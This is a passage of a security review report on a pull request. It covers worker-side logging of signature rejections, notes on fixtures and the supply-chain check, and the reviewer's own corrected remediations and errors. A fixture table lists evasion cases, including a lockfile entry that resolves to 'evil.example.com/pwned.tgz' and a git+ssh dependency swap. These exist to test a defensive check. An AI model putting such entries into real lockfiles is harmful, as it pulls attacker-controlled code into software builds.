**N-5 (note, non-objection) — the fixture's manifest is now an exact copy of the production dependency set, and that coupling is INHERENT rather than a defect.** Under an allowlist fence, "a manifest that passes the manifest leg" is definitionally "a manifest whose names are allowlisted", so any fixture proving the lockfile route in isolation must mirror allowlist membership. **The recurrence condition, stated so it is not rediscovered:** *narrowing* `ALLOWLIST_JSON` (dropping `jsonwebtoken`, say) re-breaks this fixture the same way E21 broke it; *widening* it does not. That recurrence is watched — by the same isolation leg that caught E21 — so I require nothing. Recorded because "the fixture mirrors production" reads like coupling to be removed, and removing it would be wrong.

**N-6 (note) — one stale workflow comment left behind by E21. Owner: DevOps, cosmetic.** The inversion step's own comment at `security-scan.yml` still describes the fixture as *"`package.json` names only a non-denylisted dep"*. Still literally true, but it no longer names the property that makes the fixture work under the allowlist (allowlisted, not merely non-denylisted) — which is the exact confusion E21 existed to resolve. One-line comment fix; fold into the D-1 commit.

## 6fbcec5 — RT-21 letter (g), the worker-side detection signal

### R-2 SUPERSEDED by R-6. My earlier ruling discharged (g) on the shipped `console.error` string line; Backend has since shipped a materially better form and asked the ADR-050 D4 question directly. That question deserves the direct answer, so R-2 is withdrawn and replaced.

### R-6 — **ACCEPT the minimal form. Clause 6 is NOT met, CANNOT be met at the worker in code, and the obligation MOVES to DevOps rather than being retired.** This does not block merge.

**ADR-050 Decision 4's criterion, quoted in full so the clause scoping is checkable:**

> **A bounded, retained, queryable signal sufficient to detect a rate anomaly in signature rejections — carrying no attacker-controlled content, requiring no tenant resolution, and with retention independent of container-log rotation.**

Evaluated clause by clause **at the worker**, against the shipped code:

| Clause | Verdict | Measured on |
|---|---|---|
| **bounded** | ✓ MET | Key space is the fixed 10-code `AuthError` enum authored in-file. No attacker-controlled key. Backend's gloss ("the KEY SPACE is bounded, not that counts are capped") is precise and is the right reading — D4's *bounded* is about the writer being attacker-reachable, which is a key-space property. |
| **retained** | ✗ PARTIAL | Counter resets on process restart; the log line lives until rotation. |
| **queryable** | ✓ MET | Structured JSON with a `reason` field — an aggregator queries without a parse step. This is a real improvement over the string-interpolated line at 3c449cc, and it is the half that makes clause 6 satisfiable **by configuration** (below). An unstructured line would not have been. |
| **no attacker-controlled content** | ✓ MET | Payload is exactly `{event, reason, count_since_start, ts}`. Verified by reading the `JSON.stringify` literal: no header value, no IP, no nonce, no token or key material. `auth.test.js` has a leg asserting this. |
| **no tenant resolution** | ✓ MET | `_rejected()` takes a reason and nothing else; `users_id` is never read on the rejection path. ⚠ This is the clause D6 explicitly warned about — *"on a rejected JWT that claim is unverified and must not be trusted as a tenant"* — and Backend avoided it. |
| **retention independent of container-log rotation** | ✗ **NOT MET** | Stated plainly by Backend rather than papered over. |

**Five of six met; the sixth is the one D4 itself calls out as *"the property actually being lost today."* So the gap is the load-bearing one, and it still does not block. Here is why, and the reasoning matters more than the verdict.**

**⚠ First, a premise in ADR-050 Decision 6 has been falsified by R2 (C), and it is the premise that would otherwise decide this.** D6 argues row-per-event *"may be legitimately correct for F3"* because *"`/internal/pdf-render` is a **cross-container endpoint on the private Docker network**"*. D6 was written 2026-08-10, when the verifier was the **app's** inbound route — a surface with DB reach. **R2 (C), ruled 2026-09-04, retired that route and moved the verifier to the worker.** D6's *threat-model* half **survives** the flip intact (the worker's render endpoint is equally private-network-only and RT-27-fenced, so the unbounded-INSERT objection still does not transfer). D6's *feasibility* half **does not**: it presupposed a rejecting party that could write a row. At the worker, a row-per-event store is not merely undesirable, it is **structurally unavailable** — Lock 13 mod #2, D-1, no exception. **This should be recorded against ADR-050 D6, because the next reader will otherwise apply D6's conclusion to a surface it was not written about.**

**Second, clause 6 is not a code obligation and never was.** It says *"retention independent of container-log rotation"* — not *"retention implemented in the rejecting process."* The two ways a zero-DB-reach container could satisfy it in code are (a) a DB write, which is vetoed, and (b) a file on the container filesystem, which is exactly as ephemeral as the log and buys a writable path for nothing. **The third way is the correct one and it is a configuration, not a code change: ship this container's stderr to a log sink with its own retention.** The structured-JSON form Backend chose is precisely what makes that sink able to serve D4 — `reason` becomes a queryable field rather than a substring to regex out of prose.

**Therefore: `joint-review:sec`, owner DevOps, not Backend.** Book it as a tracked issue, not a PR-body follow-up line — a follow-up recorded only in a merged PR description has no watcher. Discharge criterion: worker stderr reaches a sink whose retention outlives container restarts and rotation, and a query over `event = "pdf_render_auth_rejected"` grouped by `reason` returns a rate over a window longer than one rotation period.

**⚠ Two binding constraints on that follow-up, because both are shapes someone would reach for and both would reverse a shipped control:**

1. **The retention surface must NOT be built by having the worker echo its reason code back in the response.** `server.js` deliberately returns a bare 401 — *"never the reason, which would help an attacker iterate toward a valid forgery."* Relaying the reason to the caller so the app can store it would trade an admission-control property for an observability one. If a future design proposes it, that is a Sec re-consult, not a detail.
2. **An app-side rejection counter is NOT a substitute and must not be recorded as one.** It measures a different population: the app is the only *legitimate* caller, so an anomaly it observes means the app is malfunctioning. **An attacker on the private network who is not the app produces rejections the app never sees** — and those are the ones RT-21 (g) exists to detect. The worker-side signal is the only observer of that population, which is exactly why its retention gap is load-bearing rather than cosmetic.

**Implementation quality — reviewed, and it is good.** Every throw site routes through `_rejected()`; `grep -n "throw new AuthError"` over `auth.js` returns **zero** hits, so the counter and the log line cannot drift from the reason set (the failure mode the helper exists to prevent, and the one that would have been introduced by a per-site `console.error`). Reason-code precedence is correct: `signing_key_not_configured` is evaluated before any attacker input is parsed, so a misconfigured worker reports misconfiguration rather than mislabelling it as malformed input. The 6 new tests each fail for their own reason, including the distinct-keys-never-collapsed leg and a leg asserting the log line carries no token or key material.

**N-7 (note) — the counter has no reader other than the log line it is embedded in.** `_rejectionCounts` is exported only to tests; no endpoint surfaces it. So `count_since_start` adds a per-line running total (a single line reveals a rate without aggregation) and nothing more. That is a modest but real gain and I am not asking for an endpoint — an unauthenticated metrics endpoint on this container would be a new admission surface under RT-27, which is a worse trade.

**N-8 (note) — log-volume amplification, accepted.** One stderr line per rejected request; an attacker already on the project network can drive unbounded log volume, and rotation is the only bound. This is the RT-05 unbounded-writer objection in log form — and per D6 it **does not transfer**, for D6's own stated reason: an adversary inside the private network has produced a far larger incident than a full log. Accepted. ⚠ Worth one sentence in the DevOps follow-up: whatever sink is chosen needs a volume cap, or the retention fix reintroduces the cost-DOS that D5 rejected shape (a) over.

## ⚠ CORRECTION TO MY OWN F-12 REMEDIATION — the fix I proposed would have broken both golden fixtures

In the main report I proposed that the lockfile-side fix assert `resolved` matches `^https://registry\.npmjs\.org/`. **Measured: both golden fixtures use `https://example-registry.invalid/...` — 2 non-matching entries in `manifest-direct/`, 3 in `lockfile-transitive/`, 5 of 5 total.** My narrowing constraint would have red-lit every fixture that seeds the barred value, and the tempting repair for that red is to rewrite the fixtures to use the real registry host — which would make them look like real manifests, exactly what a `DO NOT install or use as a template` fixture must not become.

**Corrected predicate, verified empirically rather than reasoned:** for every `lock.packages` entry carrying a `resolved` field, assert (i) `nameFromResolved(resolved)` is non-null **and equals** `entry.name || <key's last node_modules segment>`, and (ii) `integrity` is present.

| Target | Violations under the corrected predicate |
|---|---|
| real `workers/pdf-render/package-lock.json` | **0** |
| golden `manifest-direct/` | **0** |
| golden `lockfile-transitive/` | **0** |
| e9 (allowlisted name, `resolved: https://evil.example.com/pwned.tgz`) | **1** — resolved-name-mismatch |
| e10 (`node_modules/harmless` ← `git+ssh://…/pg.git`) | **2** — resolved-name-mismatch + no-integrity |

Host-agnostic, so it survives a proxy/mirror registry and both fixtures; catches both evasions; lands green on the tree. **This supersedes the F-12 remediation text in the main report — do not implement the registry-host form.**

## Findings status at 6fbcec5

- **F-11** (merge condition) — OPEN, unchanged, re-confirmed by re-running the e8 fixture (rc=0).
- **D-1** (merge condition) — OPEN, unchanged. Fold N-6's one-line comment fix into the same commit.
- **F-12** — OPEN, **remediation corrected above.**
- **F-13** — PARTIALLY IMPROVED. `test/auth.test.js` now watches the auth surface with 6 legs. Still no watcher for `_childEnvWithoutSecrets()`, `/healthz`, or a `docker build` smoke, and the PR body still names all three. **The PR body must be corrected before F/CTO ratify.**
- **F-14** — OPEN, and now **cheaper to close than I first scoped it.** `test/auth.test.js` needs **no Chromium** — verified by running it with no `PUPPETEER_EXECUTABLE_PATH`. So a CI job can watch the entire auth half today with a bare `actions/setup-node` + `npm ci` + `node --test test/auth.test.js`, no browser install step, before anyone solves the Chromium-in-CI question for `render.test.js`. That materially shrinks the interim gap and I'd take it even if the render half waits for P10. ⚠ The `render.test.js:25` pass-on-skip hazard is unchanged: if the render half is wired later, unset `PUPPETEER_EXECUTABLE_PATH` must **fail**, not skip.
- **F-15 / F-16 / F-17 / F-18, N-1 … N-4** — all unchanged; none of the touched files bears on them.
- **N-5 / N-6 / N-7 / N-8** — new, all non-blocking, all recorded above.

## Second error of my own, named here
While re-running the three fences at `6fbcec5` I wrote a `for f in "<script> <arg>"` loop and invoked `bash $f`. The Bash tool runs **zsh**, which does not word-split unquoted parameters, so all three invocations became a single bogus path and returned `rc=127`. I caught it because 127 is not a code any of these fences emits, and re-ran them individually — the rc=0/0/0 above are from the corrected invocations. Recording it because a 127 misread as a failure would have produced three false findings, and because it is a hazard already in my own memory that I walked into anyway.
